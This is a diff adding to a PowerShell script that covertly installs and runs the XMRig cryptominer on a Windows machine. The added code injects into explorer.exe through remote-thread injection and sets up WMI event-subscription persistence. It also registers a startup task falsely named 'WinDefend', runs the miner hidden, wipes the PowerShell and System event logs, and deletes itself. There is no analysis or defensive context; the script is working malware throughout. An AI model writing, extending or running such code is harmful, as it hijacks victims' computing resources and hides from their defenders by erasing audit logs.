@@ -11,10 +11,110 @@ while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIde
     }
 }
 
-Set-Variable -Name Trigger -Value (New-ScheduledTaskTrigger -AtStartup
+$minerHome = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2"
+$minerBinary = "xmrig.exe"
 
-Set-Variable -Name Action -Value (New-ScheduledTaskAction -Argument "/c C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2\w.bat" -Execute "cmd.exe")
+### === PHASE 5: PROCESS INJECTION ===
+try {
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Injector {
+        [DllImport("kernel32.dll")] 
+        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+        [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true)]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32.dll", ExactSpelling=true, SetLastError=true)]
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll", SetLastError=true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    }
+"@ -ErrorAction Stop
 
-Set-Variable -Name Settings -Value (New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 7) -RestartCount 5 -DontStopIfGoingOnBatteries)
+    $targetProc = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
+    $hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProc.Id)
+    $loadLib = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
+    $alloc = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint]"$minerHome\$minerBinary".Length + 1, 0x3000, 0x40)
+    [Injector]::WriteProcessMemory($hProcess, $alloc, [Text.Encoding]::ASCII.GetBytes("$minerHome\$minerBinary"), [uint]"$minerHome\$minerBinary".Length + 1, [ref][UIntPtr]::Zero)
+    [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [IntPtr]::Zero)
+}
+catch {
+    Start-Sleep -Seconds 3600
+    Start-Process "$minerHome\$minerBinary" -WindowStyle Hidden
+}
 
-Register-ScheduledTask -Settings $Settings -Action $Action -Trigger $Trigger -Description "Monitor and update Antivirus if any error occurs." -TaskName "WMImon"
+### === PHASE 6: PERSISTENCE MECHANISMS ===
+# Clean existing WMI entries
+Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
+    Where-Object {$_.Name -like "SysHealth_*"} | 
+    Remove-WmiObject -ErrorAction SilentlyContinue
+
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | 
+    Where-Object {$_.Name -like "SysMaint_*"} | 
+    Remove-WmiObject -ErrorAction SilentlyContinue
+
+# WMI Subscription
+try {
+    $wmiFilterQuery = @"
+    SELECT * FROM __InstanceModificationEvent WITHIN 60 
+    WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
+    AND TargetInstance.SystemUpTime >= 300
+"@
+
+    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+        Name = "SysHealth_$((Get-Date).Ticks)"
+        EventNamespace = 'root\cimv2'  # Critical fix
+        Query = $wmiFilterQuery
+        QueryLanguage = "WQL"
+    }
+
+    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+        Name = "SysMaint_$((Get-Date).Ticks)"
+        CommandLineTemplate = "`"$minerHome\$minerBinary`" --donate-level=0"
+    }
+
+    $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+        Filter = $filter.__PATH
+        Consumer = $consumer.__PATH
+    }
+}
+catch {
+    Write-Warning "WMI persistence failed: $($_.Exception.Message)"
+}
+
+# Scheduled Task
+try {
+    $taskSettings = New-ScheduledTaskSettingsSet `
+        -StartWhenAvailable `
+        -DontStopIfGoingOnBatteries `
+        -MultipleInstances IgnoreNew
+
+    $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Min 2 -Max 5))
+    Register-ScheduledTask -TaskName "WinDefend_$((Get-Date).Ticks)" `
+        -Trigger $trigger `
+        -Action (New-ScheduledTaskAction -Execute "$minerHome\$minerBinary" -Argument "--donate-level=0") `
+        -Settings $taskSettings `
+        -Force | Out-Null
+}
+catch {
+    Write-Warning "Scheduled task creation failed: $($_.Exception.Message)"
+}
+
+# Process watchdog
+if (-not (Get-Process -Name (Get-Item $minerHome\$minerBinary).BaseName -ErrorAction SilentlyContinue)) {
+    Start-Process "$minerHome\$minerBinary" -WindowStyle Hidden
+}
+
+# Log cleanup
+wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+wevtutil cl "System" 2>$null
+
+# Self-cleanup
+if (-not $PSCommandPath.Contains("xmrig-6.22.2")) {
+    Start-Process powershell "-Command `"Start-Sleep 5; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
+}
+
